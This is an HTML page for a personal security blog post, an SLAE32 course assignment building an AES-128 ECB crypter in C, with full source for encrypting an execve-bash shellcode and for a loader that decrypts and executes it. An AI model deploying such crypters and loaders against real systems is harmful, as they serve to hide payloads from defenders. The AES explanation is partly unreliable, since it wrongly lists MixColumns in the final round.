@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>SLAE32 | Jeremy Catelain</title>
+<meta name="generator" content="Jekyll v3.9.2" />
+<meta property="og:title" content="SLAE32" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description of the assignment Create a custom crypter like the one shown in the “crypters” video Free to use any existing encryption schema Can use any programmming language" />
+<meta property="og:description" content="Description of the assignment Create a custom crypter like the one shown in the “crypters” video Free to use any existing encryption schema Can use any programmming language" />
+<link rel="canonical" href="http://localhost:4000/slae32/2022/10/05/Assign7-Crypter.html" />
+<meta property="og:url" content="http://localhost:4000/slae32/2022/10/05/Assign7-Crypter.html" />
+<meta property="og:site_name" content="Jeremy Catelain" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-10-05T08:45:58+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SLAE32" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-05T08:45:58+02:00","datePublished":"2022-10-05T08:45:58+02:00","description":"Description of the assignment Create a custom crypter like the one shown in the “crypters” video Free to use any existing encryption schema Can use any programmming language","headline":"SLAE32","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/slae32/2022/10/05/Assign7-Crypter.html"},"url":"http://localhost:4000/slae32/2022/10/05/Assign7-Crypter.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Jeremy Catelain" /></head>
+<body><header class="site-header" role="banner">
+
+    <div class="wrapper"><div class="align-left">
+            <div class="image-cropper"><img src="/images/photo-profil-2.jpg" alt="photo de profil" class="rounded" /></div>
+            <div class="align-left2">
+                <a class="site-title" rel="author" href="/">Jeremy Catelain </a><div class="site-job">Cybersecurity Consultant</div></div>
+        </div><nav class="site-nav">
+            <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+            <label for="nav-trigger">
+                <span class="menu-icon">
+                    <svg viewBox="0 0 18 15" width="18px" height="15px">
+                        <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z" />
+                    </svg>
+                </span>
+            </label>
+
+            <div class="trigger"><a class="page-link" href="/categories/2022-09-14-categories.html">CATEGORIES</a><a class="page-link" href="/">Home</a><a class="page-link" href="/about/">ABOUT</a></div>
+        </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+
+        <div class="wrapper">
+                <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+        <header class="post-header">
+            <div class="post-header-about">
+                <h1 class="post-list-heading2 p-name" itemprop="name headline">SLAE32</h1>
+                <h1 class="post-list-heading3 p-name" itemprop="name headline">|  Assignment 7 - Crypter</h1>
+            </div>
+            <p class="post-meta-title">
+                <time class="dt-published" datetime="2022-10-05T08:45:58+02:00" itemprop="datePublished">Oct 5, 2022
+                </time></p><div class="github-link">
+                <a class="github-link-post" href="https://github.com/jeremycatelain/SLAE32-Assignments/tree/main/assignment7"> Github repository </a>
+            </div></header>
+
+        <div class="post-content e-content" itemprop="articleBody">
+            <h3 id="-description-of-the-assignment-"><span style="color:#2d8fb3;"> Description of the assignment </span></h3>
+
+<ul>
+  <li>Create a custom crypter like the one shown in the “crypters” video</li>
+  <li>Free to use any existing encryption schema</li>
+  <li>Can use any programmming language</li>
+</ul>
+
+<!--more-->
+
+<h3 id="-aes-128-ecb-"><span style="color:#2d8fb3;"> AES 128 ECB </span></h3>
+
+<p>For this assessment, I decided to use the AES128 encryption algorithm in the ECB mode from the OpenSSL library.</p>
+
+<p>For reminder, the AES (Advanced Encyrption Standard) is a variation of the Rjindael encryption algorithm with fixed block size of of 128 bits, and with a key size of 128, 192 or 256 bits.
+The key size defined the number of transformation rounds that will convert your plaintext data into the ciphertext.</p>
+
+<p>As follows the number of rounds per key size:</p>
+<ul>
+  <li>10 rounds for 128-bit keys.</li>
+  <li>12 rounds for 192-bit keys.</li>
+  <li>14 rounds for 256-bit keys.</li>
+</ul>
+
+<p>The AES encryption algorithm is composed of the following steps (if a 128 cipher key is used):</p>
+<ol>
+  <li>Key Scheduling / Key Expension - Define the round keys derived from the cipher key using the AES Key Scheduling.</li>
+  <li>Initial round key addition (AddRoundKey) - The state (128 bits block of plaintext that we want to encrypt) is combined with a byte of the round key (cipher key) using bitwise xor.</li>
+  <li>Then the following steps are performed 9 times:
+    <ul>
+      <li>SubBytes - Substitution step</li>
+      <li>ShiftRows - Transposition step</li>
+      <li>MixColumns - Linear mixing operation</li>
+      <li>AddRoundKey - Xoring step</li>
+    </ul>
+  </li>
+  <li>Final Round:
+    <ul>
+      <li>SubBytes - Substitution step</li>
+      <li>ShiftRows - Transposition step</li>
+      <li>MixColumns - Linear mixing operation</li>
+    </ul>
+  </li>
+</ol>
+
+<p><img src="/assets/slae32-img/assignment7/algo.PNG" alt="drawing" style="width:900px;" /></p>
+
+<p>For more information you can check the following sources:</p>
+<ul>
+  <li><a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard" style="color:#2d8fb3;">en.wikipedia.org</a></li>
+  <li><a href="https://www.youtube.com/watch?v=O4xNJsjtN6E&amp;t=473s" style="color:#2d8fb3;">Computerphile</a></li>
+  <li><a href="https://www.youtube.com/watch?v=pSCoquEJsIo" style="color:#2d8fb3;">Hafnium - Sécurité informatique (French)</a></li>
+</ul>
+
+<p>Then, as I mentionned previously, I used the ECB encryption mode, which basically repeat the encryption operation described previously on every 128 bits of the payload that we want to encrypt.</p>
+
+<p><img src="/assets/slae32-img/assignment7/modeecb.PNG" alt="drawing" style="width:900px;" /></p>
+
+<p>For more information you can check the following source:</p>
+<ul>
+  <li><a href="https://www.highgo.ca/2019/08/08/the-difference-in-five-modes-in-the-aes-encryption-algorithm/" style="color:#2d8fb3;">AES modes - www.highgo.ca</a></li>
+</ul>
+
+<h3 id="-explanation-of-the-work-"><span style="color:#2d8fb3;"> Explanation of the work </span></h3>
+
+<p>So, as i mentionned previously, I used the AES128 encryption algorithm from the OpenSSL library which is composed of several functions.</p>
+
+<p>The first one to use if the <strong><em>AES_set_encrypt_key()</em></strong> which corresponds to the AES Key Scheduling / Key Expension activity.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AES_set_encrypt_key(encryption_key, 128, &amp;enc_key);  
+</code></pre></div></div>
+
+<p>Then, we have to perform the encryption of the payload with the <strong><em>AES_encrypt()</em></strong> function.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>while(c1 &lt; shellcode_len){
+	AES_encrypt(shellcode + c1, enc_out + c1, &amp;enc_key); 
+	c1 += 16;
+}
+</code></pre></div></div>
+
+<p>In the first, to ensure that the encryption and the decryption went well.
+To do so, I used the <strong><em>AES_set_decrypt_key()</em></strong> function which does the same as the <strong><em>AES_set_encrypt_key()</em></strong> function. the  I decrypted as well the shellcode by using</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AES_set_decrypt_key(encryption_key, 128, &amp;dec_key);
+</code></pre></div></div>
+
+<p>And finally, I used the <strong><em>AES_decrypt()</em></strong> function which _decrypt 128 bits by 128 bits our encrypted shellcode.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>while(c2 &lt; enc_out_len){
+	AES_decrypt(enc_out + c2, dec_out + c2, &amp;dec_key);
+	c2 += 16;
+}
+</code></pre></div></div>
+
+<p>To perform this assessment, is wrote tow codes, a first one which take as input the encryption key that will be used to encrypt the shellcode.</p>
+
+<p><img src="/assets/slae32-img/assignment7/execution.PNG" alt="drawing" style="width:900px;" /></p>
+
+<p>And another one, which decrypt the encrypted shellcode by providing the encryption key and execute it at the same time.</p>
+
+<p><img src="/assets/slae32-img/assignment7/execution2.PNG" alt="drawing" style="width:900px;" /></p>
+
+<p>Link to the OpenBSD manual:</p>
+<ul>
+  <li>https://man.openbsd.org/AES_encrypt.3</li>
+</ul>
+
+<p>You can find as follows respectively the source code to encrypt a simple shellcode and the source code to decrypt and execute the shellcode.</p>
+
+<p><strong>Source code AES Crypter:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/*
+
+    Author : Jeremy Catelain
+    Filename : aes-cryptor.c
+
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;openssl/aes.h&gt;
+
+// GLOBAL VARIABLES
+unsigned char shellcode[] = \
+"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; // to modify 
+
+AES_KEY enc_key, dec_key;
+// Initialisation tables for the encrypted and decrypted payloads
+unsigned char enc_out[100];
+unsigned char dec_out[100];
+
+// Shellcode printer
+void print_shellcode(unsigned char shellc[]) {
+    int len = strlen(shellc);
+    for (int i = 0; i &lt; len; i++) {
+        printf("\\x%02x", shellc[i]);
+    }
+}
+
+// Encryption 
+void encryption(unsigned char *encryption_key, int shellcode_len){
+
+    AES_set_encrypt_key(encryption_key, 128, &amp;enc_key); // AES key scheduling - Expand the Userkey, which is bits long into the key structure to preprare for encryption.
+
+    // The encryption is performed 16 bytes by 16 bytes
+    long c1 = 0;
+    while(c1 &lt; shellcode_len){
+	    AES_encrypt(shellcode + c1, enc_out + c1, &amp;enc_key); 
+	    c1 += 16;
+    }
+}
+
+// Decryption
+void decryption(unsigned char *encryption_key, int enc_out_len){
+
+    AES_set_decrypt_key(encryption_key, 128, &amp;dec_key);
+
+    // Decyption performed 16 bytes by 16 bytes
+    long c2 = 0;
+    while(c2 &lt; enc_out_len){
+	    AES_decrypt(enc_out + c2, dec_out + c2, &amp;dec_key);
+	    c2 += 16;
+    }
+}
+
+int aes_workflow(unsigned char *encryption_key) {
+
+    int shellcode_len = strlen(shellcode);
+
+    //Encryption of the payload
+    encryption(encryption_key, shellcode_len);
+
+    // Length of the encrypted payload
+    int enc_out_len = strlen((unsigned char *)enc_out);
+
+    //Decryption of the payload
+    decryption(encryption_key, enc_out_len);
+
+    // Length of the decrypted payload
+    int dec_out_len = strlen((unsigned char *)dec_out);
+
+    if (shellcode_len != dec_out_len){
+	    printf("ATTENTION: Length of the Encryption key too small.\n");
+    }
+
+    printf("Original:\t");
+    print_shellcode(shellcode);
+    printf("\nEncrypted:\t");
+    print_shellcode(enc_out);
+    printf("\nDecrypted:\t");
+    print_shellcode(dec_out);
+
+}
+
+int main(int argc, char* argv[])
+{
+    unsigned char *encryption_key;
+    int encryption_key_length;
+    encryption_key = (unsigned char *)argv[1];
+    encryption_key_length = strlen((unsigned char *)encryption_key);
+    printf("Encryption started...\n");
+
+    printf("The Encryption key length : %d\n", encryption_key_length);
+    // Verification that the key length is 16 bytes
+    if (encryption_key_length &gt; 16){
+	    printf ("ATTENTION: Only the first 16 bytes of the Encryption key will be taken: \"");
+	    for (int i=0; i&lt;16; i++){
+		    printf("%c",*(encryption_key+i));
+	    }
+	    printf("\"\n");
+    }
+    aes_workflow(encryption_key);
+    return 0;
+}
+</code></pre></div></div>
+
+<p><strong>Source code AES Decrypter:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/*
+
+    Author : Jeremy Catelain
+    Filename : aes-cryptor.c
+
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;openssl/aes.h&gt;
+
+// GLOBAL VARIABLES
+unsigned char encrypted_shellcode[] = \
+"\xc3\xf8\x41\x52\xf0\xfc\x42\x13\xb1\x76\x52\x62\xaa\x98\x92\x3e\x99\x74\x26\x4b\x06\x48\x2d\xd7\x56\x33\x96\xc7\xc8\x24\x7a\x6e"; // to modify 
+
+AES_KEY dec_key;
+// Initialisation table for the shellcode
+unsigned char shellcode[100];
+
+// Shellcode printer
+void print_shellcode(unsigned char shellc[]) {
+    int len = strlen(shellc);
+    for (int i = 0; i &lt; len; i++) {
+        printf("\\x%02x", shellc[i]);
+    }
+}
+
+// Decryption
+void decryption(unsigned char *decryption_key, int encrypted_shellcode_len){
+
+    AES_set_decrypt_key(decryption_key, 128, &amp;dec_key);
+
+    // Decyption performed 16 bytes by 16 bytes
+    long c = 0;
+    while(c &lt; encrypted_shellcode_len){
+        AES_decrypt(encrypted_shellcode + c, shellcode + c, &amp;dec_key);
+        c += 16;
+    }
+}
+
+int main(int argc, char* argv[])
+{
+
+    unsigned char* decryption_key = (unsigned char *)argv[1];
+
+    printf("Decryption started...\n");
+
+    int encrypted_shellcode_len = strlen((unsigned char *)encrypted_shellcode);
+    printf("Shellcode Length: %d\n", encrypted_shellcode_len);
+
+    decryption(decryption_key, encrypted_shellcode_len);
+
+    int (*ret)() = (int(*)())shellcode;
+
+    ret();
+
+}
+</code></pre></div></div>
+
+
+        </div>
+
+
+        <!--<a class="u-url" href="/slae32/2022/10/05/Assign7-Crypter.html" hidden></a>
+          -->
+    </article>
+
+        </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+      <!--<h2 class="footer-heading">Jeremy Catelain</h2> -->
+
+    <div class="Github-link"></div>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <!--<ul class="contact-list">
+          <li class="p-name">Jeremy Catelain</li>
+        </ul> -->
+      </div>
+
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a class="social-media-listed" href="https://github.com/jeremycatelain"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jeremycatelain</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+          <p>COPYRIGHT 2022 JEREMY CATELAIN - ALL RIGHTS RESERVED.</p>
+      </div>
+  </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
